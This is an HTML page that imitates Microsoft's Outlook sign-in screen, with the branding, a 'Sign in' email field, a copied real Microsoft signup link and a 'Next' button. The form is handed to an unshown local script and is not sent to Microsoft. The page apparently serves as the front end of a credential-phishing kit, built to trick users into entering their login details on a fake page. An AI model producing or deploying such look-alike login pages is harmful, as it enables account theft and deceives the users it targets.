<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no" />

    <!-- Bootstrap CSS -->
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
      integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N"
      crossorigin="anonymous" />
    <link rel="stylesheet" href="css/Homepage.css" />
    <title>Outlook</title>
  </head>
  <body class="backgroundp">
    <div class="container">
      <div class="row">
        <div class="col-md-4"></div>
        <div class="col-md-4 formsection">
          <img src="/image/RE1Mu3b.png" alt="" style="height: 33px" />
          <div>
            <h1
              style="font-size: 35px; font-weight: 600; color: black"
              class="mt-4">
              Sign in
            </h1>
            <p style="font-size: 18px; font-weight: 400; margin-bottom: 0px">
              to continue to Outlook
            </p>
          </div>

          <form id="form">
            <label for="email"></label>
            <input
              required
              name="email"
              type="email"
              id="email"
              placeholder="Email, phone, or Skype"
              style="
                width: 100%;
                padding-top: 10px;
                padding-bottom: 10px;
                border: solid 0px white;
                font-size: 20px;
                margin-top: 0px;
                outline: none;
              " />

            <div
              style="height: 1.2px; background-color: grey; width: 100%"
              class="mb-4"></div>
            <p class="mb-5" style="font-size: 18px">
              No account?
              <a
                href="https://signup.live.com/signup?cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&id=292841&contextid=5E8389438074C12F&opid=B945D4B1D6D08EFA&bk=1743010438&sru=https://login.live.com/login.srf%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26id%3d292841%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26id%3d292841%26contextid%3d5E8389438074C12F%26opid%3dB945D4B1D6D08EFA%26mkt%3dEN-US%26lc%3d1033%26bk%3d1743010438%26uaid%3d5d45bc77d87148f486261e9a25b395e1&lw=dob,flname,wld&fl=1&uiflavor=web&lic=1&mkt=EN-US&lc=1033&uaid=5d45bc77d87148f486261e9a25b395e1"
                >Create one!</a
              >
            </p>
            <div style="display: flex; justify-content: flex-end" class="mt-5">
              <button
                id="next"
                style="
                  background-color: rgb(0, 103, 184);
                  font-size: 20px;
                  padding-top: 7px;
                  padding-bottom: 7px;
                  padding-left: 48px;
                  padding-right: 48px;
                  color: white;
                  border: solid 1px white;
                ">
                Next
              </button>
            </div>
          </form>
        </div>

        <div class="col-md-4"></div>
      </div>
      <div class="row">
        <div class="col-md-4"></div>
        <div class="col-md-4 mouseover">
          <button
            style="
              border: solid 0px white;
              background-color: white;
              font-size: 20px;
              font-weight: 400;
            ">
            <img
              src="/image/signin_options_4e48046ce74f4b89d450.svg"
              alt=""
              class="pr-3" />
            Sign-in options
          </button>
        </div>
        <div class="col-md-4"></div>
      </div>
      <div class="row">
        <div class="col-md-4"></div>
        <div class="col-md-4 termsandprivacy">
          <p>
            <strong class="mr-3" style="font-weight: 400">Terms of use</strong>
            <strong class="mr-3" style="font-weight: 400"
              >Privacy & cookies</strong
            ><strong style="font-weight: 400">. . .</strong>
          </p>
          <p>Use private browsing if this is not your device. Learn more</p>
        </div>
        <div class="col-md-4"></div>
      </div>
    </div>
    <script src="./js/index.js"></script>
    <script
      src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"
      integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
      crossorigin="anonymous"></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct"
      crossorigin="anonymous"></script>
  </body>
</html>
